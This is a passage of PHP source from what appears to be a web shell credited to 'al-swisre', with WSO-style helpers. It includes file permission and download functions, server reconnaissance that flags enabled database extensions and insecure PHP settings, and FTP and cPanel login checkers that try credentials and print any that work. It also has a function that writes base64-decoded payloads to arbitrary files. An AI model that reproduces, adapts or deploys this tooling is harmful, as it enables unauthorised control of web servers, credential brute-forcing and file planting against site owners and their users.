            $query = "SELECT * FROM `$table` WHERE `$column` LIKE '%$string%'";
            $query = mysql_query($query);
            $result = mysql_num_rows($query);
            if($result > 0){
                $founded[] = array('table'=>$table,'column'=>$column);
            }
        }
    }
    return $founded;
}

    function cleandir($d){ // Function to clean up the $dir and $curdir variables
    $d = @realpath($d);
    $d = str_replace("\\\\", "\\", $d);
    $d = str_replace("////", "//", $d);
    return($d);
}

function wsoPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000>' . @wsoPerms(@fileperms($f)) . '</font>';
	elseif (!@is_writable($f))
		return '<font color=white>' . @wsoPerms(@fileperms($f)) . '</font>';
	else
		return '<font color=#25ff00>' . @wsoPerms(@fileperms($f)) . '</font>';
}

function wsoPerms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}

function perm($file)
{
 if(file_exists($file))
 {
  return @substr(@sprintf('%o', @fileperms($file)), -4);
 }
 else
 {
  return "????";
 }
}

function sa_download($path)
	{
	header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($path));
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header('Content-Length: ' . filesize($path));
    ob_clean();
    flush();
    readfile($path);
    exit;
	}

    function findit($mytext,$starttag,$endtag) {
 $posLeft  = @stripos($mytext,$starttag)+strlen($starttag);
 $posRight = @stripos($mytext,$endtag,$posLeft+1);
 return  @substr($mytext,$posLeft,$posRight-$posLeft);
}

function MsSQL()
{
	if(@function_exists('mssql_connect'))
	{
		$msSQL = '<font color="red">ON</font>';
	}
	else
	{
		$msSQL = '<font color="green">OFF</font>';
	}
	return $msSQL;
}
function MySQL2()
{
	$mysql_try = @function_exists('mysql_connect');
	if($mysql_try)
	{
		$mysql = '<font color="red">ON</font>';
	}
	else
	{
		$mysql = '<font color="green">OFF</font>';
	}
	return $mysql;
}
function Gzip()
{
	if (@function_exists('gzencode'))
	{
		$gzip = '<font color="red">ON</font>';
	}
	else
	{
		$gzip = '<font color="green">OFF</font>';
	}
	return $gzip;
}
function MysqlI()
{
	if (@function_exists('mysqli_connect'))
	{
		$mysqli = '<font color="red">ON</font>';
	}
	else
	{
		$mysqli = '<font color="green">OFF</font>';
	}
	return $mysqli;
}
function MSQL()
{
	if (@function_exists('msql_connect'))
	{
		$mSql = '<font color="red">ON</font>';
	}
	else
	{
		$mSql = '<font color="green">OFF</font>';
	}
	return $mSql;
}
function PostgreSQL()
{
	if(@function_exists('pg_connect'))
	{
		$postgreSQL = '<font color="red">ON</font>';
	}
	else
	{
		$postgreSQL = '<font color="green">OFF</font>';
	}
	return $postgreSQL;
}

function Oracle()
{
	if(@function_exists('ocilogon'))
	{
		$oracle = '<font color="red">ON</font>';
	}
	else
	{
		$oracle = '<font color="green">OFF</font>';
	}
	return $oracle;
}


function RegisterGlobals()
{
	if(@ini_get('register_globals'))
	{
		$registerg= '<font color="red">ON</font>';
	}
	else
	{
		$registerg= '<font color="green">OFF</font>';
	}
	return $registerg;
}
function HardSize($size)
{
	if($size >= 1073741824)
	{
		$size = @round($size / 1073741824 * 100) / 100 . " GB";
	}
	elseif($size >= 1048576)
	{
		$size = @round($size / 1048576 * 100) / 100 . " MB";
	}
	elseif($size >= 1024)
	{
		$size = @round($size / 1024 * 100) / 100 . " KB";
	}
	else
	{
		$size = $size . " B";
	}
	return $size;
}
function Curl()
{
	if(extension_loaded('curl'))
	{
		$curl = '<font color="red">ON</font>';
	}
	else
	{
		$curl = '<font color="green">OFF</font>';
	}
	return $curl;
}

function magicQouts()
{
	$mag=get_magic_quotes_gpc();
	if (empty($mag))
	{
		$mag = '<font color="green">OFF</font>';
	}
	else
	{
		$mag= '<font color="red">ON</font>';
	}
	return $mag;
}

function openBaseDir()
{
$openBaseDir = @ini_get("open_basedir");
if (!$openBaseDir)
    {
		$openBaseDir = '<font color="green">OFF</font>';
	}
    else
	{
		$openBaseDir = '<font color="red">ON</font>';
	}
	return $openBaseDir;
}

function ftp_check($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "ftp://$host");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 ) {

print "<b> Error : Connection timed out </b>";
exit;}

elseif ( curl_errno($ch) == 0 ){

print
"
<b>found username : <font color='#FF0000'> $user </font> - password :
<font color='#FF0000'> $pass </font></b><br>";}curl_close($ch);
exit;}


function cpanel_check($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 28 ) {
print "<b> Error : Connection timed out</b>";
exit;}
elseif ( curl_errno($ch) == 0 ){

print
"
<b>found username : <font color='#FF0000'>$user</font> - password :
<font color='#FF0000'>$pass </font></b><br>"; }curl_close($ch);
exit; }


		function op_sa($f,$t) {
			$w = @fopen($f,"w") or @function_exists('file_put_contents');
			if($w){
				@fwrite($w,@base64_decode($t));
				@fclose($w);
			}
		}


  echo "</td></tr></table></div> |<b class='foter'>Progr4m3r by <a href='$pg?sws=ab'>al-swisre</a></b>|<b class='foter'>E-m4il : <a href='#'>oy3@hotmail.com</a></b>|<b class='foter'>My twitter : <a target='_blank' href='http://twitter.com/#!/al_swisre'>al_swisre</a></b>| </html> ";



?>



